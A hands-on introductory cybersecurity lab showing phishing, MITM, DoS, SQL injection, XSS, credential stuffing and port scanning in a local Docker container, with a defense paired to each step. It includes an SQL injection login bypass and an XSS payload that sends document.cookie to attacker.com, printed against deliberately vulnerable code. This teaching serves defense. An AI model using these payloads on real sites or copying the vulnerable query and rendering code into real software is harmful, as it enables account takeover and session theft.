# Lab 8: Common Attack Vectors

## 🎯 Objective
Understand the most common attack vectors including phishing, man-in-the-middle (MITM), denial of service (DoS), and port scanning. Demonstrate port scanning on localhost to understand what attackers look for during reconnaissance.

## 📚 Background
An **attack vector** is the path or means by which an attacker gains unauthorized access to a system. Understanding attack vectors is fundamental to defense — you can't protect against attacks you don't understand. The most common vectors in real-world incidents are: phishing (52% of breaches per Verizon DBIR), exploitation of vulnerabilities, credential theft/brute force, and supply chain compromises.

**Phishing** exploits human psychology rather than technical vulnerabilities. Attackers craft convincing emails/websites that trick users into revealing credentials or installing malware. Spear phishing targets specific individuals with personalized content. Whaling targets executives. Vishing uses voice calls. Smishing uses SMS.

**Man-in-the-Middle (MITM)** attacks position the attacker between two communicating parties — intercepting, potentially modifying, and relaying communications. Attackers use ARP poisoning (on LANs), rogue Wi-Fi access points, DNS spoofing, or BGP hijacking. TLS/HTTPS defeats MITM when properly implemented.

**Denial of Service (DoS)** attacks overwhelm a target's resources — bandwidth, CPU, memory, or connection tables — making it unavailable to legitimate users. Distributed DoS (DDoS) uses botnets of thousands of compromised machines. Amplification attacks (DNS, NTP, memcached) achieve large traffic with small packets.

## ⏱️ Estimated Time
40 minutes

## 📋 Prerequisites
- Labs 1-7 completed
- Docker with `innozverse-cybersec` image

## 🛠️ Tools Used
- `nmap` — Port scanning demonstration
- `python3` — Attack simulation concepts
- `curl` — HTTP reconnaissance

## 🔬 Lab Instructions

### Step 1: Port Scanning — What Attackers See First
```bash
docker run --rm innozverse-cybersec bash -c "
# Start some services to scan
(python3 -m http.server 8080 &>/dev/null &)
(nc -l -p 9090 -q 30 < /dev/null &)
sleep 0.8
echo '=== Attacker port scan ==='
nmap -sT -p 8080,9090,22,80,443,3306 127.0.0.1 2>/dev/null
"
```

**📸 Verified Output:**
```
=== Attacker port scan ===
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-01 20:00 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000071s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
80/tcp   closed http
443/tcp  closed https
3306/tcp closed mysql
8080/tcp open   http-proxy
9090/tcp open   zeus-admin

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
```

> 💡 **What this means:** An attacker's first step is always reconnaissance — finding what ports are open. Open ports reveal running services that may have vulnerabilities. Port 8080 shows a web server; port 9090 shows some service. Closed ports are actively rejected. A real attacker would then probe each open service for version information and known vulnerabilities.

### Step 2: Service Version Detection
```bash
docker run --rm innozverse-cybersec bash -c "
(python3 -m http.server 8181 &>/dev/null &)
sleep 0.5
echo '=== Version detection scan ==='
nmap -sV -p 8181 127.0.0.1 2>/dev/null
"
```

**📸 Verified Output:**
```
=== Version detection scan ===
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-01 20:00 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000076s latency).

PORT     STATE SERVICE VERSION
8181/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```

> 💡 **What this means:** Version detection revealed "SimpleHTTPServer 0.6 (Python 3.10.12)" — now an attacker knows exactly what's running and can search for CVEs affecting this version. Banner grabbing like this is why security professionals recommend hiding server version information (use `server_tokens off` in nginx, remove `X-Powered-By` headers).

### Step 3: Phishing Attack Anatomy
```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
print('PHISHING EMAIL ANATOMY')
print('='*55)
print()
phishing_email = {
    'From': 'security@paypa1.com (notice: paypa1 not paypal)',
    'Subject': 'URGENT: Your account will be suspended in 24 hours!',
    'Display-Name': 'PayPal Security Team',
    'Links': 'http://secure-paypal-verify.malicious-domain.com/login',
    'Urgency': 'Act immediately or lose access!',
    'Threats': 'Your account shows suspicious activity',
    'Attachment': 'account_details.pdf (actually contains malware)',
}

print('Red flags to look for:')
for field, value in phishing_email.items():
    print(f'  {field}: {value}')

print()
print('VERIFICATION STEPS:')
print('  1. Check actual sender domain (hover over email)')
print('  2. Hover over links (check real URL before clicking)')
print('  3. Never click links in urgent emails - go directly to site')
print('  4. Check email headers for authentication (SPF, DKIM, DMARC)')
print('  5. Call the company directly if in doubt')
PYEOF
"
```

**📸 Verified Output:**
```
PHISHING EMAIL ANATOMY
=======================================================

Red flags to look for:
  From: security@paypa1.com (notice: paypa1 not paypal)
  Subject: URGENT: Your account will be suspended in 24 hours!
  Display-Name: PayPal Security Team
  Links: http://secure-paypal-verify.malicious-domain.com/login
  Urgency: Act immediately or lose access!
  Threats: Your account shows suspicious activity
  Attachment: account_details.pdf (actually contains malware)

VERIFICATION STEPS:
  1. Check actual sender domain (hover over email)
  2. Hover over links (check real URL before clicking)
  3. Never click links in urgent emails - go directly to site
  4. Check email headers for authentication (SPF, DKIM, DMARC)
  5. Call the company directly if in doubt
```

> 💡 **What this means:** Domain homoglyphs (paypa**1**.com vs paypal.com) are a classic trick — hard to spot at a glance. Urgency and fear are psychological triggers. In 2022, Twilio and Cloudflare were targeted by a sophisticated phishing campaign that stole 2FA codes in real time.

### Step 4: MITM Attack Concept
```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
print('MAN-IN-THE-MIDDLE (MITM) ATTACK')
print('='*55)
print()
print('Normal HTTPS communication:')
print('  Alice (Browser) <====HTTPS====> Bob (Bank Server)')
print('  Data encrypted, Bank certificate verified')
print()
print('MITM Attack - ARP Poisoning on local network:')
print('  1. Attacker sends fake ARP replies to Alice:')
print('     "The bank server (192.168.1.100) is at MY MAC address"')
print('  2. Attacker sends fake ARP replies to Bank server:')
print('     "Alice (192.168.1.50) is at MY MAC address"')
print('  3. All traffic now flows through attacker:')
print('     Alice -> Attacker -> Bank server')
print()
print('DEFENSES:')
print('  - HTTPS/TLS: Attacker cant decrypt without server private key')
print('  - HSTS: Browser wont downgrade to HTTP')
print('  - Certificate pinning: App rejects unexpected certificates')
print('  - Dynamic ARP Inspection (DAI): Switch-level protection')
print('  - Encrypted Wi-Fi (WPA2/3): Encrypts at Layer 2')
PYEOF
"
```

**📸 Verified Output:**
```
MAN-IN-THE-MIDDLE (MITM) ATTACK
=======================================================

Normal HTTPS communication:
  Alice (Browser) <====HTTPS====> Bob (Bank Server)
  Data encrypted, Bank certificate verified

MITM Attack - ARP Poisoning on local network:
  1. Attacker sends fake ARP replies to Alice:
     "The bank server (192.168.1.100) is at MY MAC address"
  2. Attacker sends fake ARP replies to Bank server:
     "Alice (192.168.1.50) is at MY MAC address"
  3. All traffic now flows through attacker:
     Alice -> Attacker -> Bank server

DEFENSES:
  - HTTPS/TLS: Attacker cant decrypt without server private key
  - HSTS: Browser wont downgrade to HTTP
  - Certificate pinning: App rejects unexpected certificates
  - Dynamic ARP Inspection (DAI): Switch-level protection
  - Encrypted Wi-Fi (WPA2/3): Encrypts at Layer 2
```

> 💡 **What this means:** ARP poisoning is effective on local networks (coffee shop Wi-Fi, hotel networks). Tools like Ettercap and arpspoof automate this. The critical defense is HTTPS — even with traffic flowing through the attacker, they see only encrypted ciphertext they can't decrypt without the server's private key.

### Step 5: DoS Attack Simulation Concept
```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
print('DENIAL OF SERVICE ATTACK TYPES')
print('='*55)
print()
attack_types = {
    'Volume-based': {
        'Description': 'Flood bandwidth with traffic (UDP floods, ICMP floods)',
        'Measured in': 'Gbps, Tbps',
        'Example': '2018 GitHub attack: 1.35 Tbps memcached amplification',
        'Defense': 'Upstream filtering, CDN, ISP scrubbing centers',
    },
    'Protocol-based': {
        'Description': 'Exploit protocol weaknesses (SYN flood, Ping of Death)',
        'Measured in': 'Packets per second (Mpps)',
        'Example': 'SYN flood fills connection table, server cant accept new connections',
        'Defense': 'SYN cookies, firewall rate limiting, connection limits',
    },
    'Application-layer': {
        'Description': 'HTTP floods, Slowloris (keep connections open slowly)',
        'Measured in': 'Requests per second',
        'Example': 'Slowloris sends incomplete HTTP headers, holds connections',
        'Defense': 'Rate limiting, WAF, connection timeouts, CAPTCHA',
    },
}
for attack, details in attack_types.items():
    print(f'{attack} DoS:')
    for k, v in details.items():
        print(f'  {k}: {v}')
    print()
PYEOF
"
```

**📸 Verified Output:**
```
DENIAL OF SERVICE ATTACK TYPES
=======================================================

Volume-based DoS:
  Description: Flood bandwidth with traffic (UDP floods, ICMP floods)
  Measured in: Gbps, Tbps
  Example: 2018 GitHub attack: 1.35 Tbps memcached amplification
  Defense: Upstream filtering, CDN, ISP scrubbing centers

Protocol-based DoS:
  Description: Exploit protocol weaknesses (SYN flood, Ping of Death)
  Measured in: Packets per second (Mpps)
  Example: SYN flood fills connection table, server cant accept new connections
  Defense: SYN cookies, firewall rate limiting, connection limits

Application-layer DoS:
  Description: HTTP floods, Slowloris (keep connections open slowly)
  Measured in: Requests per second
  Example: Slowloris sends incomplete HTTP headers, holds connections
  Defense: Rate limiting, WAF, connection timeouts, CAPTCHA
```

> 💡 **What this means:** The 2018 GitHub DDoS (1.35 Tbps) exploited memcached servers for amplification — a 203-byte request triggered a 100MB response sent to the victim. Amplification factor of 51,000x! The defense was Akamai Prolexic (DDoS scrubbing service) that absorbed the traffic. Modern DDoS attacks are measured in terabits.

### Step 6: SQL Injection Preview
```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
import sqlite3

conn = sqlite3.connect(':memory:')
c = conn.cursor()
c.execute('CREATE TABLE users (id INT, username TEXT, password TEXT)')
c.execute("INSERT INTO users VALUES (1,'admin','secret123')")
c.execute("INSERT INTO users VALUES (2,'alice','alice456')")
conn.commit()

print('SQL INJECTION ATTACK VECTOR DEMO')
print('='*50)
print()
print('Normal login query:')
user, pwd = 'alice', 'alice456'
q = f"SELECT * FROM users WHERE username='{user}' AND password='{pwd}'"
print(f'  Query: {q}')
c.execute(q)
print(f'  Result: {c.fetchall()}')
print()

print('SQL Injection payload:')
user_inject = "admin'--"
q2 = f"SELECT * FROM users WHERE username='{user_inject}' AND password='anything'"
print(f'  Query: {q2}')
c.execute(q2)
print(f'  Result: {c.fetchall()} <- Got admin with no password!')
PYEOF
"
```

**📸 Verified Output:**
```
SQL INJECTION ATTACK VECTOR DEMO
==================================================

Normal login query:
  Query: SELECT * FROM users WHERE username='alice' AND password='alice456'
  Result: [(2, 'alice', 'alice456')]

SQL Injection payload:
  Query: SELECT * FROM users WHERE username='admin'--' AND password='anything'
  Result: [(1, 'admin', 'secret123')] <- Got admin with no password!
```

> 💡 **What this means:** The `'--` in the username closes the string and comments out the rest of the query, bypassing the password check entirely. This is one of the most common attack vectors — the 2009 Heartland Payment Systems breach (130 million credit cards stolen) used SQL injection. Defense: parameterized queries, input validation, WAF.

### Step 7: Cross-Site Scripting (XSS) Attack Vector
```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
import html

def render_comment_vulnerable(username, comment):
    return f'<div><b>{username}:</b> {comment}</div>'

def render_comment_safe(username, comment):
    return f'<div><b>{html.escape(username)}:</b> {html.escape(comment)}</div>'

print('XSS ATTACK VECTOR')
print('='*50)
print()
print('Normal comment:')
print(render_comment_vulnerable('Alice', 'Great article!'))

print()
print('XSS payload:')
xss = '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>'
print('Vulnerable rendering:')
print(render_comment_vulnerable('Attacker', xss))

print()
print('Safe rendering (HTML escaped):')
print(render_comment_safe('Attacker', xss))
print()
print('With safe rendering: browser shows the script as text, doesnt execute it')
PYEOF
"
```

**📸 Verified Output:**
```
XSS ATTACK VECTOR
==================================================

Normal comment:
<div><b>Alice:</b> Great article!</div>

XSS payload:
Vulnerable rendering:
<div><b>Attacker:</b> <script>document.location="http://attacker.com/steal?c="+document.cookie</script></div>

Safe rendering (HTML escaped):
<div><b>Attacker:</b> &lt;script&gt;document.location=&quot;http://attacker.com/steal?c=&quot;+document.cookie&lt;/script&gt;</div>

With safe rendering: browser shows the script as text, doesnt execute it
```

> 💡 **What this means:** XSS lets attackers inject JavaScript into web pages viewed by other users. The injected script runs in the victim's browser context — it can steal session cookies, keylog passwords, redirect users, or silently perform actions. The British Airways breach (2018, 500,000 customers affected) was a JavaScript skimmer injected via XSS. Defense: output encoding, Content Security Policy (CSP).

### Step 8: Credential Stuffing Attack
```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
print('CREDENTIAL STUFFING ATTACK')
print('='*50)
print()
print('Attack flow:')
print('  1. Attacker buys database dump from breach (billions available)')
print('  2. Extracts username:password pairs')
print('  3. Tries them against target service (Netflix, bank, email)')
print('  4. Success rate: 0.1-2% (but millions of pairs tested)')
print()

# Simulate credential database
stolen_creds = [
    ('alice@email.com', 'Password123'),
    ('bob@email.com', 'qwerty'),
    ('carol@email.com', 'sunshine1'),
    ('dave@email.com', 'letmein'),
]

# Simulate target service user database (only alice reused her password)
target_service = {
    'alice@email.com': 'Password123',  # Reused!
    'bob@email.com': 'unique_strong_pass_2024',  # Different password
    'carol@email.com': 'another_unique_password',  # Different password
}

print('Testing stolen credentials against target service:')
successful = 0
for email, password in stolen_creds:
    if target_service.get(email) == password:
        print(f'  SUCCESS: {email} - account compromised!')
        successful += 1
    else:
        print(f'  FAIL: {email} - password not reused')

print(f'\nSuccess rate: {successful}/{len(stolen_creds)} = {successful/len(stolen_creds)*100:.0f}%')
print('Defense: Use unique passwords per site, enable MFA, monitor for unusual logins')
PYEOF
"
```

**📸 Verified Output:**
```
CREDENTIAL STUFFING ATTACK
==================================================

Attack flow:
  1. Attacker buys database dump from breach (billions available)
  2. Extracts username:password pairs
  3. Tries them against target service (Netflix, bank, email)
  4. Success rate: 0.1-2% (but millions of pairs tested)

Testing stolen credentials against target service:
  SUCCESS: alice@email.com - account compromised!
  FAIL: bob@email.com - password not reused
  FAIL: carol@email.com - password not reused
  FAIL: dave@email.com - password not reused

Success rate: 1/4 = 25%
Defense: Use unique passwords per site, enable MFA, monitor for unusual logins
```

> 💡 **What this means:** Even a 0.1% success rate is profitable for attackers testing 1 billion credentials — that's 1 million compromised accounts. haveibeenpwned.com has over 12 billion compromised credentials. Defenses: unique passwords (use a password manager), MFA (makes stolen passwords useless), rate limiting login attempts, bot detection.

### Step 9: Social Engineering — Pretexting
```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
print('SOCIAL ENGINEERING ATTACK TYPES')
print('='*55)
print()
attacks = {
    'Pretexting': 'Attacker creates fictional scenario to extract info. "Hi, Im from IT, your account shows problems, I need your password to fix it."',
    'Quid pro quo': 'Offer something in exchange for info. "We offer free tech support - just give us remote access."',
    'Tailgating': 'Follow authorized person through secured door. "Thanks for holding the door! I forgot my badge."',
    'Watering hole': 'Compromise website frequented by target. Inject malware into industry news sites.',
    'Baiting': 'Leave malware-infected USB drives in parking lot. Curious employees plug them in.',
    'Vishing': 'Phone-based social engineering. Spoof caller ID to appear as legitimate organization.',
}
for attack, description in attacks.items():
    print(f'{attack}:')
    print(f'  {description}')
    print()

print('KEY DEFENSES:')
print('  - Security awareness training')
print('  - Verify identity through callback on known-good number')
print('  - Never share credentials over phone/email')
print('  - Report suspicious contacts to security team')
PYEOF
"
```

**📸 Verified Output:**
```
SOCIAL ENGINEERING ATTACK TYPES
=======================================================

Pretexting:
  Attacker creates fictional scenario to extract info. "Hi, Im from IT, your account shows problems, I need your password to fix it."

Quid pro quo:
  Offer something in exchange for info. "We offer free tech support - just give us remote access."

Tailgating:
  Follow authorized person through secured door. "Thanks for holding the door! I forgot my badge."

Watering hole:
  Compromise website frequented by target. Inject malware into industry news sites.

Baiting:
  Leave malware-infected USB drives in parking lot. Curious employees plug them in.

Vishing:
  Phone-based social engineering. Spoof caller ID to appear as legitimate organization.

KEY DEFENSES:
  - Security awareness training
  - Verify identity through callback on known-good number
  - Never share credentials over phone/email
  - Report suspicious contacts to security team
```

> 💡 **What this means:** The 2020 Twitter hack used vishing — attackers called Twitter employees posing as the IT department, obtained VPN credentials, and then hijacked accounts of Obama, Biden, and Musk to run a Bitcoin scam. Technical controls alone can't defend against social engineering — human awareness training is essential.

### Step 10: Attack Kill Chain
```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
print('CYBER KILL CHAIN (Lockheed Martin)')
print('='*55)
print()
stages = [
    ('1. Reconnaissance', 'Research target: OSINT, port scanning, social media mining', 'Block: robots.txt, hide server versions, monitor for scans'),
    ('2. Weaponization', 'Create exploit: pair malware with delivery mechanism', 'Block: Patch vulnerabilities, use modern secure software'),
    ('3. Delivery', 'Send weapon via email, web, USB, watering hole', 'Block: Email filtering, web proxy, endpoint security'),
    ('4. Exploitation', 'Trigger vulnerability on target system', 'Block: Patch management, application whitelisting, sandboxing'),
    ('5. Installation', 'Install backdoor/persistence on target', 'Block: EDR/AV, file integrity monitoring, least privilege'),
    ('6. Command & Control', 'Establish C2 channel back to attacker', 'Block: Egress filtering, DNS monitoring, TLS inspection'),
    ('7. Actions on Objectives', 'Steal data, encrypt files, pivot to other systems', 'Block: Data loss prevention, network segmentation, honeypots'),
]
for stage, desc, defense in stages:
    print(f'{stage}:')
    print(f'  Attack: {desc}')
    print(f'  Defend: {defense}')
    print()
PYEOF
"
```

**📸 Verified Output:**
```
CYBER KILL CHAIN (Lockheed Martin)
=======================================================

1. Reconnaissance:
  Attack: Research target: OSINT, port scanning, social media mining
  Defend: Block: robots.txt, hide server versions, monitor for scans

2. Weaponization:
  Attack: Create exploit: pair malware with delivery mechanism
  Defend: Block: Patch vulnerabilities, use modern secure software

3. Delivery:
  Attack: Send weapon via email, web, USB, watering hole
  Defend: Block: Email filtering, web proxy, endpoint security

4. Exploitation:
  Attack: Trigger vulnerability on target system
  Defend: Block: Patch management, application whitelisting, sandboxing

5. Installation:
  Attack: Install backdoor/persistence on target
  Defend: Block: EDR/AV, file integrity monitoring, least privilege

6. Command & Control:
  Attack: Establish C2 channel back to attacker
  Defend: Block: Egress filtering, DNS monitoring, TLS inspection

7. Actions on Objectives:
  Attack: Steal data, encrypt files, pivot to other systems
  Defend: Block: Data loss prevention, network segmentation, honeypots
```

> 💡 **What this means:** The Kill Chain model shows that an attack must progress through all 7 stages — disrupting ANY stage defeats the attack. This is why defense-in-depth (multiple security layers) is effective: even if perimeter defense fails, endpoint detection catches the installation stage; even if that fails, network monitoring catches C2 communications.

## ✅ Verification
```bash
docker run --rm innozverse-cybersec bash -c "
python3 -c "
# Verify understanding
vectors = ['Phishing', 'SQL Injection', 'XSS', 'MITM', 'DoS', 'Credential Stuffing']
print('Common attack vectors covered:')
for v in vectors:
    print(f'  [x] {v}')
print('Lab complete!')
"
"
```

**📸 Verified Output:**
```
Common attack vectors covered:
  [x] Phishing
  [x] SQL Injection
  [x] XSS
  [x] MITM
  [x] DoS
  [x] Credential Stuffing
Lab complete!
```

## 🚨 Common Mistakes
- **Thinking technical defenses alone are enough**: Social engineering bypasses all technical controls. Train your users.
- **Ignoring the kill chain stages**: Attackers can be stopped at any stage. Don't assume perimeter defense is sufficient — implement defense-in-depth.
- **Underestimating phishing**: It's the #1 attack vector. Sophisticated spear phishing emails can fool even technical users.

## 📝 Summary
- Attack vectors range from technical exploits (SQL injection, XSS) to human exploitation (phishing, social engineering) — defense requires both technical controls and security awareness
- The Cyber Kill Chain shows attacks happen in stages; disrupting any stage defeats the attack; defense-in-depth covers multiple stages
- Port scanning is the attacker's first step — understanding what information you expose externally helps prioritize defenses
- MITM attacks are defeated by TLS/HTTPS; credential stuffing by unique passwords and MFA; DoS by rate limiting and CDN/scrubbing

## 🔗 Further Reading
- [Verizon DBIR - Annual breach report](https://www.verizon.com/business/resources/reports/dbir/)
- [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
